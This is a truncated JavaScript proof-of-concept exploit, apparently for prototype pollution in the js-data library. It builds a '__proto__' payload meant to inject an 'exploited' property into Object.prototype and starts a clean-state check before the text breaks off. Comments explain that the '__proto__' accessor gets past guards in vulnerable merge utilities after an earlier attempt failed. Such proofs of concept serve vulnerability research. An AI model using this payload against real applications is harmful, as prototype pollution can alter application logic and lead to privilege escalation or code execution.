async function exploit() {
  const JSData = require('js-data');

  // Initialize a clean target object
  const target = {};

  // Payload targeting the prototype chain via __proto__.
  // Modern JavaScript engines (V8/Node.js) actively guard against direct assignment 
  // to `obj.constructor.prototype`, which caused the previous attempt to fail. 
  // Using the standard '__proto__' accessor bypasses this guard in vulnerable merge utilities.
  const payload = { "__proto__": { "exploited": true } };

  console.log("[*] Verifying clean state before exploit...");
  if ({}.exploited !== undefined) {
